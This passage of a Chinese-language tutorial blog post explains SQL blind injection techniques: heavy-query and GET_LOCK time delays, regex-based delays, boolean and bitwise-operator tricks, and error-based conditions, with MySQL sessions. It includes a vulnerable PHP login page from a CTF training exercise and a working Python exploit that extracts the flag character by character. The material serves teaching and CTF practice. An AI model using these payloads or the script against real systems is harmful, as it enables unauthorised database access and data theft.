alt="此处输入图片的描述"></p><p>我们还能在条件语句中结合延时函数达到猜解字段的目的</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A813.png" alt="此处输入图片的描述"></p><h4 id="补充-SQL-Server的方法："><a href="#补充-SQL-Server的方法：" class="headerlink" title="补充 SQL Server的方法："></a><strong>补充 SQL Server的方法：</strong></h4><p>判断是否存在注入：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A816.png" alt="此处输入图片的描述"></p><p>判断数据库用户是否为 sa:</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A817.png" alt="此处输入图片的描述"></p><blockquote><p>注：这里闭合前面语句其实也可以将其划分到堆叠注入的类别里。</p></blockquote><p>但是当我们没有办法使用 <strong>sleep(50000)—&gt;睡眠</strong>  和 <strong>benchmark(10000000,md5(‘a’))—&gt;测试函数执行速度</strong> 的时候我们还能用下面的方式来实现我们的目的。 </p><h3 id="2-Heavy-Query-笛卡尔积"><a href="#2-Heavy-Query-笛卡尔积" class="headerlink" title="2.Heavy Query 笛卡尔积"></a><strong>2.Heavy Query 笛卡尔积</strong></h3><p>这种方式我把它称之为 Heavy Query 中的 <strong>“笛卡尔积”</strong>，具体的方式就是将简单的表查询不断的叠加，使之以指数倍运算量的速度增长，不断增加系统执行 sql 语句的负荷，直到产生攻击者想要的时间延迟，这就非常的类似于 dos 这个系统，我们可以简单的将这种模式用下面的示意图表示。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A81.png" alt="此处输入图片的描述"></p><p>由于每个数据库的数据量差异较大，并且有着自己独特的表与字段，所以为了使用这种方式发起攻击，我们不能依赖于不同数据库的特性而是要依赖于数据库的共性，也就是利用系统自带的表和字段来完成攻击，下面是一个能够在 SQL SERVER 和 MYSQL 中成功执行的模板：</p><pre><code class="hljs"> SELECT count(*) FROM information_schema.columns A,information_schema.columns B,information_schema.columns C;</code></pre><p>根据数据库查询的特点，这句话的意思就是将 A B C 三个表进行笛卡尔积（全排列），并输出 最终的行数，执行效果如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A82.png" alt="此处输入图片的描述"></p><p>我们来单独执行一次对这个 columns 表的查询，然后对这个结果进行 3 次方运算，如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A83.png" alt="此处输入图片的描述"></p><p>可以看到，和我们的分析是一样的，但是从时间来看，这种时间差是运算量指数级增加的结果。</p><p>那么假如，我们可以构造这样的一条语句</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A84.png" alt="此处输入图片的描述"></p><p>如果系统返回结果的时间明显与之前有差异，那么最有可能的情况就是我们注入的语句成功在系统内执行，也就是说存在注入漏洞。</p><p>除此之外，我们还可以构造我们想要的判断语句，结合我们的 笛卡尔积 实现字段的猜解（<strong>当然也不能太 Heavy 了，适可而止，否则可能要注到天荒地老</strong>）</p><h3 id="3-Get-lock-加锁机制"><a href="#3-Get-lock-加锁机制" class="headerlink" title="3.Get_lock() 加锁机制"></a><strong>3.Get_lock() 加锁机制</strong></h3><p>在单数据库的环境下，如果想防止多个线程操作同一个表（多个线程可能分布在不同的机器上），可以使用这种方式，取表名为key，操作前进行加锁，操作结束之后进行释放，这样在多个线程的时候，即保证了单个表的串行操作，又保证了多个不同表的并行操作。</p><p>这种方式注入的思路来源于 pwnhub的一道新题”全宇宙最最简单的PHP博客系统” ，先来看一下 get_lock() 是什么</p><ul><li><strong>GET_LOCK(key,timeout)</strong></li></ul><p><strong>基本语句：</strong></p><pre><code class="hljs">SELECT GET_LOCK(key, timeout) FROM DUAL;SELECT RELEASE_LOCK(key) FROM DUAL;</code></pre><blockquote><p><strong>注：</strong></p></blockquote><blockquote><p>1.这里的 dual 是一个伪表，在 MySQL 中可以直接使用 select 1；这种查询语句，但是在 oracle 中却必须要满足 select 语句的结构，于是就有了这个相当于占位符的伪表，当然在 MYSQL 中也是可以使用的<br>2.key 这个参数表示的是字段</p></blockquote><p>(1)GET_LOCK有两个参数，一个是key,表示要加锁的字段，另一个是加锁失败后的等待时间(s)，一个客户端对某个字段加锁以后另一个客户端再想对这个字段加锁就会失败，然后就会等待设定好的时间</p><p>(2)当调用 RELEASE_LOCK来释放上面加的锁或客户端断线了，上面的锁才会释放，其它的客户端才能进来。</p><p><strong>我们来简单的实验一下</strong></p><p>现在我有这样一个表</p><pre><code class="hljs">mysql&gt; desc admin;+----------+--------------+------+-----+---------+-------+| Field    | Type         | Null | Key | Default | Extra |+----------+--------------+------+-----+---------+-------+| username | varchar(100) | NO   |     | NULL    |       || flag     | varchar(100) | NO   |     | NULL    |       |+----------+--------------+------+-----+---------+-------+2 rows in set (0.38 sec)</code></pre><p>我首先对 username 字段进行加锁</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A85.png" alt="此处输入图片的描述"></p><p>然后我再尝试打开另一个终端，对同样的字段进行加锁尝试</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A86.png" alt="此处输入图片的描述"></p><p>可以看到语句没有执行成功返回 0 ，并且由于该字段已经被加锁的原因，这次的执行时间是自定义的 5s 。</p><p>现在我们给这个字段解锁：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A87.png" alt="此处输入图片的描述"></p><p>再次尝试另一个终端的加锁</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A88.png" alt="此处输入图片的描述"></p><p>可以看到没有任何的延时，并且返回 1 表示加锁成功</p><p>好了，有了上面的基础，我们是否能根据我上面对时间盲注原理的简单分析来举一反三实现利用 get_lock() 这种延时方式构造时间盲注语句呢？</p><p><strong>(1)我们首先通过注入实现对 username 字段的加锁</strong></p><pre><code class="hljs">select * from ctf where flag = 1 and get_lock(&#39;username&#39;,1);</code></pre><p><strong>(2)然后构造我们的盲注语句</strong></p><pre><code class="hljs">select * from ctf where flag = 1 and 1 and get_lock(&#39;username&#39;,5);select * from ctf where flag = 1 and 0 and get_lock(&#39;username&#39;,5);</code></pre><h4 id="分析到这里似乎已经结束了，但是其实这个-get-lock-的使用并不是没有限制条件"><a href="#分析到这里似乎已经结束了，但是其实这个-get-lock-的使用并不是没有限制条件" class="headerlink" title="分析到这里似乎已经结束了，但是其实这个 get_lock 的使用并不是没有限制条件"></a><strong>分析到这里似乎已经结束了，但是其实这个 get_lock 的使用并不是没有限制条件</strong></h4><p>限制条件就是数据库的连接必须是<strong>持久连接</strong>，我们知道 mysql_connect() 连接数据库后开始查询，然后调用 mysql_close() 关闭与数据库的连接，也就是 web 服务器与数据库服务器连接的生命周期就是整个脚本运行的生命周期，脚本结束连接即断开，但是很明显这里我们要利用的是前一个连接对后一个连接的阻碍作用导致延时，所以这里的连接必须是持久的。</p><p><strong>php 手册中对持久连接这样描述</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A89.png" alt="此处输入图片的描述"></p><p>php 中使用 mysql_pconnect 来创建一个持久的连接，当时这道题使用的也是这个函数来创建的数据库连接</p><p><strong>那么什么时候会出现需要我们使用持久连接的情况呢？</strong></p><p><strong>php 手册这样解释道</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A810.png" alt="此处输入图片的描述"></p><p>现在分析正式结束了.</p><h3 id="4-Heavy-Query-正则表达式"><a href="#4-Heavy-Query-正则表达式" class="headerlink" title="4.Heavy Query 正则表达式"></a><strong>4.Heavy Query 正则表达式</strong></h3><p>这种方式与我第一个讲的 <strong>Heavy Query 笛卡尔积</strong>略有不同，这里是使用大量的正则匹配来达到拖慢系统实现时延的，我认为本质是相同的，所以我还是将其归纳为 Heavy Query 中的一类。</p><p>mysql 中的正则有三种常用的方式 like 、rlike 和 regexp ，其中 Like 是精确匹配，而 rlike 和 regexp 是模糊匹配(只要正则能满足匹配字符串的子字符串就OK了)</p><p><strong>当然他们所使用的通配符略有差异：</strong></p><p>(1)like 常用通配符：% 、_ 、escape</p><pre><code class="hljs">% : 匹配0个或任意多个字符_ : 匹配任意一个字符escape ： 转义字符，可匹配%和_。如SELECT * FROM table_name WHERE column_name LIKE &#39;/%/_%_&#39; ESCAPE&#39;/&#39;</code></pre><p>(2)rlike和regexp:常用通配符：. 、* 、 [] 、 ^ 、 $ 、{n}</p><pre><code class="hljs">. : 匹配任意单个字符* ： 匹配0个或多个前一个得到的字符[] : 匹配任意一个[]内的字符，[ab]*可匹配空串、a、b、或者由任意个a和b组成的字符串。^ : 匹配开头，如^s匹配以s或者S开头的字符串。$ : 匹配结尾，如s$匹配以s结尾的字符串。&#123;n&#125; : 匹配前一个字符反复n次。</code></pre><p><strong>我们可以这样构造：</strong></p><pre><code class="hljs">mysql&gt; select * from test where id =1 and IF(1,concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;,0) and &#39;1&#39;=&#39;1&#39;;Empty set (4.24 sec)mysql&gt; select * from content where id =1 and IF(0,concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;,0) and &#39;1&#39;=&#39;1&#39;;Empty set (0.00 sec)</code></pre><p>上面这两个语句的构造来源于 一叶飘零 师傅的博客，但是我觉得这里面有一点点问题，我发现，我在本地测试的效果并没有 一叶飘零师傅测试的那么好，延迟效果不是很明显，只有 0.29s 并且还以为 MySQL 的某种缓存机制导致我下一次执行该命令的时候直接就是 0.00s 了，当然 rlike 如果成功的话 regexp 只要简单的替换一下就 ok 了,like 的话也依次类推 。</p><p>我后来又使用了 mysql8 进行尝试(原来我的版本是 mysql 5.5.53) ，发现了下面的情况</p><pre><code class="hljs">mysql&gt; select * from test where id =1 and IF(1,concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;,0) and &#39;1&#39;=&#39;1&#39;;ERROR 3699 (HY000): Timeout exceeded in regular expression match.mysql&gt; select * from test where id =1 and IF(0,concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;,0) and &#39;1&#39;=&#39;1&#39;;Empty set (0.00 sec)</code></pre><p>在 mysql8 下也同样没有延迟，并且直接提示超时，所以我认为这个方法并不通用，与 MySQL 的版本有着比较紧密的联系。</p><h3 id="5-该种技术的优缺点"><a href="#5-该种技术的优缺点" class="headerlink" title="5.该种技术的优缺点"></a><strong>5.该种技术的优缺点</strong></h3><p>这种技术的一个主要优点是对日志几乎没有影响，特别是与基于错误的攻击相比。但是，在必须使用大量查询或 CPU密集型函数（如MySQL的BENCHMARK())的情况下，系统管理员可能会意识到正在发生的事情。</p><p>另一件需要考虑的事情是你注入的延迟时间。在测试Web应用程序时，这一点尤其重要。因为该服务器负载和网络速度可能对响应时间产生巨大的影响。你需要暂停查询足够长的时间，以确保这些不确定因素不会干扰你的测试结果。另一方面，你又会希望延迟足够短以在合理的时间内测试应用程序，所以把握这个时间长短的度是很困难的。</p><h3 id="6-一点点补充"><a href="#6-一点点补充" class="headerlink" title="6.一点点补充"></a><strong>6.一点点补充</strong></h3><p>由于平时用的不多，想在这里稍微记录一下关于 insert 和 update 的盲注示例</p><pre><code class="hljs">update users set username = &#39;0&#39;|if((substr(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1) where id=15;insert into users values (16,&#39;K0rz3n&#39;,&#39;0&#39;| if((substr(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1));</code></pre><h2 id="0X03-基于布尔的盲注"><a href="#0X03-基于布尔的盲注" class="headerlink" title="0X03 基于布尔的盲注"></a><strong>0X03 基于布尔的盲注</strong></h2><h3 id="1-使用条件"><a href="#1-使用条件" class="headerlink" title="1.使用条件"></a><strong>1.使用条件</strong></h3><p>基于布尔的盲注是在这样的一种情况下使用：页面虽然不能返回查询的结果，但是对于输入 布尔值 0 和 1 的反应是不同的，那我们就可以利用这个输入布尔值的注入点来注入我们的条件语句，从而能根据页面的返回情况推测出我们输入的语句是否正确(<strong>输入语句的真假直接影响整条查询语句最后查询的结果的真假</strong>)</p><blockquote><p><strong>注意：</strong></p><p>另外，虽然我们构造语句的目的是让整条语句在某种情况下最后查不到结果，但是这其中其实隐含了两种情况，一种就是真的没有查到结果，使得页面的返回有所不同，但是还有一种可能就是我们构造语句让其报错，这样同样让页面的返回有所不同，但是我个人往往不愿意将这种报错的模式再另外划分出一个什么报错盲注，这里我就统一将其划分到布尔盲注中了，因为本质是一样的，所以这一部分还会设计一些报错注入的东西。</p></blockquote><h3 id="2-简单举例"><a href="#2-简单举例" class="headerlink" title="2.简单举例"></a><strong>2.简单举例</strong></h3><p>这里可以举一个 SQL SERVR 的例子来说明这种攻击的原理：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A814.png" alt="此处输入图片的描述"></p><p>我们注入的语句会验证当前用户是否是系统管理员（sa）。如果条件为true，则语句 强制数据库通过执行除零来抛出错误。否则则执行一条有效指令。</p><p><strong>mysql 的语句构造方式也很简单</strong></p><pre><code class="hljs">mysql&gt; select 123 from dual where 1=1;+-----+| 123 |+-----+| 123 |+-----+1 row in set (0.00 sec)mysql&gt; select 123 from dual where 1=0;Empty set (0.00 sec)</code></pre><p>再或者我们还能在 order by 后面构造</p><pre><code class="hljs">mysql&gt; select 1 from admin order by if(1,1,(select 1 union select 2)) limit 0,3;+---+| 1 |+---+| 1 || 1 |+---+2 rows in set (0.09 sec)mysql&gt; select 1 from admin order by if(0,1,(select 1 union select 2)) limit 0,3;ERROR 1242 (21000): Subquery returns more than 1 row</code></pre><p>这里产生报错是因为，Union 查询返回的是两行，这两行都可以作为 order by 的依据，然后系统不知道该选哪一个，于是产生了错误。if 的第一个参数为真的时候不会产生错误，为假的时候产生错误，通过这种方式我们就可以判断出我们构造的条件语句的正确与否。</p><p>写到这里其实我还想起了一个比较经典的报错方式，就是使用 <code>floor(rand(0)*2)</code> 配合 <code>group by count(*)</code> 进行报错的方式，虽然之前这个用在报错注入但这里正好可以利用这个进行报错，我们来测试一下</p><pre><code class="hljs">select 1 from admin order by if(1,1,(select count(*) from mysql.user group by floor(rand(0)*2))) limit 0,3;mysql&gt; select 1 from bsqli order by if(1,1,(select count(*) from mysql.user group by floor(rand(0)*2))) limit 0,3;+---+| 1 |+---+| 1 || 1 |+---+2 rows in set (0.39 sec)mysql&gt; select 1 from bsqli order by if(0,1,(select count(*) from mysql.user group by floor(rand(0)*2))) limit 0,3;ERROR 1062 (23000): Duplicate entry &#39;1&#39; for key &#39;group_key&#39;</code></pre><p>其实不光是这条语句，很多报错注入的语句也可以直接拿来替换（当然并不是全部，比如 select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x  这个 payload 似乎就不能成功），这里只是一个小小的例子而已，关于这个语句为什么会报错，其实还是一个和有意思的探究，有兴趣的同学可以看一下这篇文章 <a href="https://www.cnblogs.com/xdans/p/5412468.html">传送门</a></p><p>构造条件语句还有很多方式，这不同的数据库中是由细微差别的，下表列出了一些例子</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A815.png" alt="此处输入图片的描述"></p><h3 id="3-高级案例"><a href="#3-高级案例" class="headerlink" title="3.高级案例"></a><strong>3.高级案例</strong></h3><p>这里我想讲的高级技巧就是 MySQL 数据库的位操作，所谓位操作就是将给定的操作数转化为二进制后，对各个操作数每一位都进行指定的逻辑运算，得到的二进制结果转换为十进制数后就是位运算的结果。在我的<a href="http://www.k0rz3n.com/2019/01/30/SQL%20%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%E7%9A%84%E5%B0%8F%E6%80%BB%E7%BB%93/">上一篇文章</a>中在最后的表格里面也列举了mysql 支持的位操作符，包括 | &amp; ^ &gt;&gt; &lt;&lt; ~ 这些字符的使用往往能让我们在被严格过滤的情况下柳暗花明。</p><h4 id="举几个例子："><a href="#举几个例子：" class="headerlink" title="举几个例子："></a><strong>举几个例子：</strong></h4><h5 id="1-使用"><a href="#1-使用" class="headerlink" title="1.使用 &amp;"></a><strong>1.使用 &amp;</strong></h5><pre><code class="hljs">mysql&gt; select * from bsqli where id = 1 &amp; 1;+----+--------+----------+| id | name   | password |+----+--------+----------+|  1 | K0rz3n | 123456   |+----+--------+----------+1 row in set (0.00 sec)mysql&gt; select * from bsqli where id = 1 &amp; 0;Empty set (0.00 sec)</code></pre><h5 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用 |"></a><strong>2.使用 |</strong></h5><pre><code class="hljs">mysql&gt; select * from bsqli where id = 0 | 1;+----+--------+----------+| id | name   | password |+----+--------+----------+|  1 | K0rz3n | 123456   |+----+--------+----------+1 row in set (0.00 sec)mysql&gt; select * from bsqli where id = 0 | 0;Empty set (0.00 sec)</code></pre><h5 id="3-使用"><a href="#3-使用" class="headerlink" title="3.使用 ^"></a><strong>3.使用 ^</strong></h5><p>上面两种可能使用的并不是很多，但是这个 ^ 异或使用的就是非常的频繁的，现在 CTF 动不动就来这个操作</p><pre><code class="hljs">mysql&gt; select * from bsqli where id = 1^0;+----+--------+----------+| id | name   | password |+----+--------+----------+|  1 | K0rz3n | 123456   |+----+--------+----------+1 row in set (0.00 sec)mysql&gt; select * from bsqli where id = 1^1;Empty set (0.00 sec)</code></pre><p>当然，还有一个异或是 XOR ，这个异或是逻辑运算符，和 ^ 还是有本质区别的，我们可以把 XOR 理解为求补集的过程</p><p>这里其实还可以举一个 CTF 题目出来，正好是我做赛前培训的一到例题：</p><p><strong>index.php</strong></p><pre><code class="hljs">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;login&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;from action=&quot;index.php?action=login&quot; method=&quot;POST&quot;&gt;username: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/br&gt;password: &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/br&gt;&lt;input type=&quot;submit&quot;&gt;&lt;/from&gt;&lt;/body&gt;&lt;/html&gt;&lt;?phpsession_start();require(&quot;conn.php&quot;);$action = isset($_GET[&#39;action&#39;]) ? $_GET[&#39;action&#39;] : &#39;&#39;;function filter($str)&#123;$pattern = &quot;/ |\*|#|;|,|is|union|like|regexp|for|and|or|file|--|\||`|&amp;|&quot;.urldecode(&#39;%09&#39;).&quot;|&quot;.urldecode(&quot;%0a&quot;).&quot;|&quot;.urldecode(&quot;%0b&quot;).&quot;|&quot;.urldecode(&#39;%0c&#39;).&quot;|&quot;.urldecode(&#39;%0d&#39;).&quot;|&quot;.urldecode(&#39;%a0&#39;).&quot;/i&quot;;if(preg_match($pattern, $str))&#123;die(&quot;hacker&quot;);&#125;return $str;&#125;if($action === &#39;login&#39;)&#123;$username = isset($_POST[&#39;username&#39;]) ? filter(strtolower(trim($_POST[&#39;username&#39;]))) : &#39;&#39;;$password = isset($_POST[&#39;password&#39;]) ? md5($_POST[&#39;password&#39;]) : &#39;&#39;;if($username == &#39;&#39;)&#123;die(&quot;Invalid username&quot;);&#125;$result = $mysqli-&gt;query(&quot;SELECT * FROM users WHERE username = &#39;&#123;$username&#125;&#39;&quot;);$row = mysqli_fetch_array($result);if(isset($row[&#39;username&#39;]))&#123;if($row[&#39;password&#39;] === $password)&#123;$_SESSION[&#39;username&#39;] = $username;$_SESSION[&#39;flag&#39;] = $row[&#39;flag&#39;];header(&#39;Location: index.php?action=main&#39;);&#125;&#125;else&#123;echo &quot;Invalid username or password&quot;; &#125;exit;&#125;elseif($action === &#39;main&#39;)&#123;if(!isset($_SESSION[&#39;username&#39;]))&#123;header(&quot;Location: index.php&quot;);exit;&#125;echo &quot;Hello, &quot; . $_SESSION[&#39;username&#39;] . &quot;, &quot; . $_SESSION[&#39;flag&#39;] . &quot;&lt;br&gt;\n&quot;;&#125;else&#123;if(isset($_SESSION[&#39;username&#39;]))&#123;header(&quot;Location: index.php?action=main&quot;);exit;&#125;&#125;highlight_file(__FILE__);?&gt;</code></pre><p>可以看到这里过滤了很多东西，但是没有过滤 ^ ，我们可以利用这个点做文章</p><p>我们可以构造条件语句来进行对flag字段进行猜解，当语句错误时，查询条件则为 ‘1’^0^’’，得1，数据库查询不到结果，网页会返回’Invalid username or password’</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A819.png" alt="此处输入图片的描述"></p><p>当语句正确时，查询条件则为 ‘1’^1^’’ ,数据库有返回结果，网页则不返回’Invalid username or password’。因此可以用它来当语句正确与否的标志，然后逐字猜解即可获得flag</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A820.png" alt="此处输入图片的描述"></p><p>我下面给出这个代码的 exp</p><p><strong>exp.py</strong></p><pre><code class="hljs">import requestsurl = &quot;http://xxx.xxx.xxx.xxx:8300/index.php?action=login&quot;data = &#123;&quot;username&quot;: &quot;&quot;,&quot;password&quot;: &quot;123&quot;&#125;payload = &quot;1&#39;^(ascii(mid((flag)from(&#123;&#125;)))&gt;&#123;&#125;)^&#39;&quot;flag = &quot;&quot;for i in xrange(1, 39):start = 32end = 126while start &lt; end:mid = (start + end) / 2data[&#39;username&#39;] = payload.format(str(i), str(mid))r = requests.post(url, data = data)if &#39;Invalid username or password&#39; not in r.content:start = mid + 1else:end = midflag += chr(start)print flag</code></pre><p>可以好好看一下这个 payload 部分是怎么构造的，联系一下我们之前讲过的内容分析一下。</p><h5 id="4-使用"><a href="#4-使用" class="headerlink" title="4.使用 ~"></a><strong>4.使用 ~</strong></h5><p>这个方法是这样的，当系统不允许输入大的数字的时候，可能是限制了字符的长度，限制了不能使用科学计数法，但是我们还是想让其报错，我们就能采取这种方式，如下所示</p><pre><code class="hljs">mysql&gt; select ~1 ;+----------------------+| ~1                   |+----------------------+| 18446744073709551614 |+----------------------+1 row in set (0.00 sec)mysql&gt; select bin(~1);+------------------------------------------------------------------+| bin(~1)                                                          |+------------------------------------------------------------------+| 1111111111111111111111111111111111111111111111111111111111111110 |+------------------------------------------------------------------+1 row in set (0.32 sec)</code></pre><p>我想学过二进制的就一目了然了，这种方法往往用在报错注入，但是实际上我之前说了，我还是把这种方式归为布尔盲注里面，请看下面的两个例子</p><h6 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a><strong>示例1：</strong></h6><pre><code class="hljs">mysql&gt; select * from bsqli where id = 1 and if(1,1,exp(~(select * from (select database())a)));+----+--------+----------+| id | name   | password |+----+--------+----------+|  1 | K0rz3n | 123456   |+----+--------+----------+1 row in set (0.00 sec)mysql&gt; select * from bsqli where id = 1 and if(0,1,exp(~(select * from (select database())a)));ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(~((select `a`.`database()` from (select database() AS `database()`) `a`)))&#39;</code></pre><h6 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a><strong>示例2：</strong></h6><pre><code class="hljs">mysql&gt; select * from bsqli where id = 1 and  if(1,1,1-~1);+----+--------+----------+| id | name   | password |+----+--------+----------+|  1 | K0rz3n | 123456   |+----+--------+----------+1 row in set (0.00 sec)mysql&gt; select * from bsqli where id = 1 and if(0,1,1-~1);ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#39;(1 - ~(1))&#39;</code></pre><h5 id="5-使用-或"><a href="#5-使用-或" class="headerlink" title="5.使用 &lt;&lt; 或 &gt;&gt;"></a><strong>5.使用 &lt;&lt; 或 &gt;&gt;</strong></h5><p>这个想法来源于外国人的一个测试 <a href="https://www.exploit-db.com/papers/17073">文章地址</a>，实际上这个方法是我们平时用的二分法的优化（好久没看这个 exploit-db 怎么变成这么炫酷了~ 逃</p><p>因为这篇文章讲的可以说是文不加点了，所以我就直接将其中的一部分翻译过来做简单的说明</p><p>我们想测试 user() 用户的第一个字符，我们需要像下面这样做</p><p><strong>(1)首先我们右移7位，可能的结果是1和0。</strong></p><pre><code class="hljs">mysql&gt; select (ascii((substr(user(),1,1))) &gt;&gt; 7)=0;+--------------------------------------+| (ascii((substr(user(),1,1))) &gt;&gt; 7)=0 |+--------------------------------------+|                                    1 |+--------------------------------------+1 row in set (0.00 sec)</code></pre><p>此时说明第一个 Bit 位为 0<br>0???????</p><p><strong>(2)下一位是0或1所以我们把它和0比较。</strong></p><pre><code class="hljs">mysql&gt; select (ascii((substr(user(),1,1))) &gt;&gt; 6)=0;+--------------------------------------+| (ascii((substr(user(),1,1))) &gt;&gt; 6)=0 |+--------------------------------------+|                                    0 |+--------------------------------------+1 row in set (0.00 sec)</code></pre><p>此时我们知道第二位 Bit 位为 1<br>01??????</p><p><strong>(3)接下来的前三位可能有下面两种</strong></p><p>010 &#x3D; 2<br>011 &#x3D; 3</p><pre><code class="hljs">mysql&gt; select (ascii((substr(user(),1,1))) &gt;&gt; 5)=2;+--------------------------------------+| (ascii((substr(user(),1,1))) &gt;&gt; 5)=2 |+--------------------------------------+|                                    0 |+--------------------------------------+1 row in set (0.00 sec)</code></pre><p>说明第三 Bit 是 1<br>011?????</p><p>…</p><p><strong>(8)最后能判断</strong></p><pre><code class="hljs">mysql&gt; select (ascii((substr(user(),1,1))) &gt;&gt; 0)=114;+----------------------------------------+| (ascii((substr(user(),1,1))) &gt;&gt; 0)=114 |+----------------------------------------+|                                      1 |+----------------------------------------+1 row in set (0.00 sec)</code></pre><p>最终的第一个字符的二进制是：<br>01110010</p><pre><code class="hljs">mysql&gt; select b&#39;01110010&#39;;+-------------+| b&#39;01110010&#39; |+-------------+| r           |+-------------+1 row in set (0.00 sec)</code></pre><p><strong>最终的字符是 r</strong></p><h5 id="6-一点点补充-1"><a href="#6-一点点补充-1" class="headerlink" title="6.一点点补充"></a><strong>6.一点点补充</strong></h5><p>同样补充一下关于 inster 和 update 的盲注示例</p><pre><code class="hljs">update users set username = &#39;0&#39; | (substr(user(),1,1) regexp 0x5e5b6d2d7a5d) where id=14;insert into users values (15,&#39;K0rz3n&#39;,&#39;0&#39;| (substr(user(),1,1) regexp 0x5e5b6d2d7a5d));</code></pre><h2 id="0X04-数据提取方法"><a href="#0X04-数据提取方法" class="headerlink" title="0X04 数据提取方法"></a><strong>0X04 数据提取方法</strong></h2><p>由于是盲注，我们看不到我们的数据回显，我们只能根据返回去猜解，那么在对数据库一无所知的情况下我们只能一位一位地猜解，这里就会用到一些截断函数以及一些转换函数。</p><p>比较常见的是 mid() substr() locate() position() substring() left() regexp  like  rlike length() char_length() ord() ascii() char() hex() 以及他们的同义函数等，当然这里还可能会需要很多的转换，比如过滤了等于号可以通过正则或者 in 或者大于小于号等替换之类的，这部分内容我会放在别的文章梳理一下，这里就不赘述了。</p><h3 id="1-举几个简单的例子："><a href="#1-举几个简单的例子：" class="headerlink" 